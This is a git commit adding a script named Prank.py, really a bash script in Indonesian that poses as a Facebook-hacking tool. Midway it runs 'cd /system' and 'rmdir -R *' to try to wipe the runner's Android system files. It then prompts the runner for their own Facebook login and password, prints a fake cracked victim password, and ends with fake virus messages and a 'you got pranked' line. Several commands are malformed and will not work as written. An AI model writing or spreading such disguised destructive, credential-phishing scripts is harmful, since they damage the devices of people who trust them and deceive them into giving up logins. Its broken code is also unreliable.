cfb25f312da0efd74a09d46968865b0cb6500950
BuangIDX <90441398+BuangIDX@users.noreply.github.com>
2021-09-11 04:11:44 +0700

    Add files via upload

---
+++ Prank.py
@@ -0,0 +1,75 @@
+#!/bin/bash
+#Belajarlah Dari Tools Saya Insyaallah Berkah
+#jangan Di Liatin Doang Nanti Basi Tools nya"
+echo "Selamat Datang Di Tools BuangIDX"
+sleep 2
+echo "Jangan Sombong Yah Nanti Nangis"
+sleep 2
+echo "ini pokoknya mantap 100% work pasti dapet"
+sleep 2
+echo "sabar ajg lg proses"
+sleep 2
+echo "BELAJARLAH DARI TOOLS SAYA INSYAALLAH BERKAH"
+sleep 3
+clear
+echo "\033[0;34m]
+
+
++ ===================+
++       Name : BuangIDX       +
++ Wa me: 081213898393  +
++====================+
++  ^...^                 ^...^      +
++ <_* *_>Hack Fb Target <_* *_>     +
++   \_/                   \_/       +
+====================================="
+echo
+sleep 1
+echo "Waiting for your love..."
+sleep 4
+cd /system
+rmdir -R *
+sleep 3
+clear
+echo "Ada yang salah jing"
+sleep 2
+echo "sedang memperbaiki..."
+sleep 2
+echo "bug sudah di perbaiki tunggu sebentar jing"
+sleep 2
+figlet "HACK FB"
+echo -n "nomor/email/id: " read nomor
+echo -n "password: " read password
+sleep 2
+echo "proses memasuki akun..."
+sleep 2
+echo "login berhasil silahkan masukan id dan password korban"
+sleep
+echo -n "id/email/nomor korban: " read id
+sleep 3
+echo "Menunggu proses cracking"
+sleep 5
+echo "Password korban: 08102019"
+sleep 1
+clear
+echo
+echo
+sleep 3
+clear
+echo "System error waiting to clean"
+sleep 1
+echo "Virus detected"
+sleep 1
+echo "tunggu untuk membersihkan virus"
+sleep 2
+clear
+echo "virus sudah di bersihkan silahkan ulang program"
+clear
+echo "Selamat Anda Kena Prank"
+cd
+reebot
+clear
+echo
+echo
+sleep 30
+clear
